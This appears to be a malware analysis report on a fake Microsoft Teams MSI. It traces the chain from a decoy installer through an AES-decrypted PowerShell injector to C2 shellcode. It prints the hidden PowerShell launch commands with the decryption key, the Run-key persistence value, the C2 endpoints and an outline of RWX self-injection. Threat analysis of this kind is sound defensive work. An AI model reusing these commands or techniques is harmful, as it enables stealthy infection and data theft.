## 3. Capabilities

- **Decoy install**: Runs legitimate Microsoft Teams Squirrel installer (`AdTJHxE6EDa3.exe`) as cover
- **4-layer obfuscation**: MSI → AES-256-CBC PS1 → gzip wrapper → shellcode injector
- **AMSI/AV evasion**: PowerShell `-EP Bypass`, `-NoProfile`, `-WindowStyle Hidden`; obfuscated `Invoke-Expression`; disguised as "Microsoft Defender" via Write-Host strings
- **Persistence**: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` → re-executes the PS1 with embedded key/IV on every login
- **Console hiding**: `ShowWindow(GetConsoleWindow(), SW_HIDE)` before any visible activity
- **Reflective shellcode injection**: VirtualAlloc (RWX) + dynamic delegate via .NET reflection; no `WriteProcessMemory` — self-injection into PowerShell process
- **WinHTTP C2**: Custom x64 shellcode contacts `www.letsdiskuss.com` using WinHTTP API with fake Firefox UA
- **Steganographic payload delivery**: Shellcode contains an embedded JPEG (~6KB) and downloads additional JPEGs from C2; next-stage payload likely hidden in image data
- **Staged execution**: `WinExec` + `CreateThread` + `VirtualProtect` for final payload execution
- **Decoy padding**: Lorem ipsum text blob embedded in shellcode (used as request body or decoy)

## 4. Attack Chain

### Stage 1 — MSI (`MTSetup_v15.3.7191.msi`)

WiX-built MSI with obfuscated product name. The cab archive (`cab1.cab`, ~1.1 MB) contains two files installed to `%TEMP%\Q6mEvnbTU4B5\`:

- `AdTJHxE6EDa3.exe` — legitimate Microsoft Teams Squirrel installer (SHA256: `a574173f6f46428bfbf852c9b9da1ed6ab4bdf11064fe719040ffffb271511be`)
- `hwkhGSmL.ps1` — stage-2 AES decryptor stub

**InstallExecuteSequence** (sequence 4001 — runs after `InstallFiles`):

```
CustomAction: CreateTask
cmd.exe /c start "" "[INSTALLFOLDER]AdTJHxE6EDa3.exe" &
powershell.exe -WindowStyle Hidden -NoProfile -EP Bypass
  -File "[INSTALLFOLDER]hwkhGSmL.ps1"
  g6O+Z1bQH+tNy+RPrtPnGcRwKCQH5BRDXc7Yu05Y828=
  G4nwKXtDyB3UKIsP8xQhdQ==
```

The AES key and IV are passed as command-line arguments.

### Stage 2 — `hwkhGSmL.ps1` (AES-256-CBC Decryptor)

Short PowerShell stub (~50 lines). Reads `$args[0]` (key) and `$args[1]` (IV), decrypts an embedded ~13 KB base64-encoded ciphertext using **AES-256-CBC / PKCS7**, and executes the result via obfuscated `Invoke-Expression`:

```powershell
# Obfuscated IEX
```

### Stage 4 — PowerShell Shellcode Injector (~25 KB)

Camouflages progress via `Write-Host "Microsoft Defender: ..."` strings. Performs three actions:

**4a. Console hiding**
```powershell
$hwnd = GetConsoleWindow()
ShowWindow($hwnd, 0)   # SW_HIDE
```

**4b. Persistence** (HKCU Run key)
```
Key:   HKCU\Software\Microsoft\Windows\CurrentVersion\Run
Name:  "Updates for Mircosoft Teams v0.tcFm2ftj"
Value: powershell.exe -WindowStyle Hidden -NoProfile -EP Bypass
       -File "<installed_ps1_path>"
       g6O+Z1bQH+tNy+RPrtPnGcRwKCQH5BRDXc7Yu05Y828=
       G4nwKXtDyB3UKIsP8xQhdQ==
```
Note: **"Mircosoft"** is intentionally misspelled (common lure trick).

**4c. Reflective shellcode injection (self-injection)**
```powershell
# 1. P/Invoke via Add-Type: LoadLibraryA, GetProcAddress, MessageBoxA
# 2. Resolve VirtualAlloc via GetProcAddress + dynamic delegate
# 3. VirtualAlloc(0, shellcode_len+16, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
# 4. Write LoadLibraryA ptr at buf[0..7], GetProcAddress ptr at buf[8..15]
# 5. Copy shellcode into buf+16
# 6. GetDelegateForFunctionPointer(buf+16) → Invoke()
```

The shellcode receives `LoadLibraryA` and `GetProcAddress` pointers at the head of its allocation — a position-independent shellcode bootstrap pattern.

### Stage 5 — Shellcode (~9,327 bytes)

Custom x64 shellcode (position-independent, no PE header).

**Imports resolved at runtime** (via the passed LoadLibraryA/GetProcAddress):

- `msvcrt.dll`: `fopen`, `fwrite`, `fclose`, `fread`, `malloc`, `free`, `strlen`, `strcmp`, `realloc`, `memcpy`
- `winhttp.dll`: `WinHttpOpen`, `WinHttpConnect`, `WinHttpOpenRequest`, `WinHttpAddRequestHeaders`, `WinHttpSendRequest`, `WinHttpReceiveResponse`, `WinHttpQueryDataAvailable`, `WinHttpReadData`, `WinHttpCloseHandle`
- `kernel32.dll`: `AddVectoredExceptionHandler`

**Behavior**:
1. **C2 check-in**: HTTP GET/POST to `www.letsdiskuss.com` with fake Firefox UA
2. **Init endpoint**: `/api/init/1ea26e48-510a-406a-97f2-8c220585f4c8` — likely returns config or next-stage URL
3. **User endpoint**: `/user/dhuahsd12d2752` — campaign tracking / victim registration
4. **JPEG payload download**: `Content-Type: image/jpeg` — downloads image containing encoded next stage (steganographic delivery)
5. **Embedded decoy JPEG**: A ~6 KB JPEG is baked into the shellcode itself (likely used as POST body or decoy traffic)
6. **Next-stage execution**: `VirtualProtect` → `WinExec` / `CreateThread`
7. **Temp path usage**: `GetTempPathA` + `SetCurrentDirectoryA` for staging
8. **Mutex**: `CreateMutexA` for single-instance enforcement

## 6. Analyst Notes

### Confirmed
- The 3-day Microsoft ID Verified AOC CA 02 cert pattern is a **recurring TTP** seen in DDinosaur.exe and StageClient across this campaign set — likely an automated infrastructure that acquires fresh short-lived certs per sample.
- The campaign token `tcFm2ftj` appears consistently: in PS1 debug Write-Host strings, in the Run key value name, and likely as a server-side campaign identifier.
- The AES key/IV are hardcoded as base64 args to the PS1, not embedded in the MSI database itself — this means the key could theoretically be rotated per victim without changing the MSI body.

### Requires Dynamic Analysis
- **Stage 6 payload**: The shellcode downloads from `www.letsdiskuss.com` — the actual final payload is operator-gated and unknown without live C2 contact. The steganographic JPEG mechanism hides the real payload type.
- **Injection target**: Stage 4 appears to self-inject into the PowerShell process, but dynamic analysis needed to confirm whether the shellcode spawns a new process or performs process hollowing via `WinExec`/`CreateThread`.
- **C2 liveness**: `www.letsdiskuss.com` may be a legitimate-looking domain (real site exists) hijacked or typosquatted for C2 blending.
- **Mutex name**: `CreateMutexA` is called but the mutex name string was not recovered from static analysis.

### Alternative Hypotheses
- The `lorem ipsum` text in the shellcode could be used as a decoy HTTP body to blend C2 traffic with legitimate web requests.
- The embedded JPEG in the shellcode may serve as the POST body for the `/api/init/` request, with the server responding with a JPEG containing the operator payload.
- `MT` in the filename may stand for "MetaTrader" (a trading platform) rather than "Microsoft Teams" — the MSI could be distributed via crypto/trading forums.
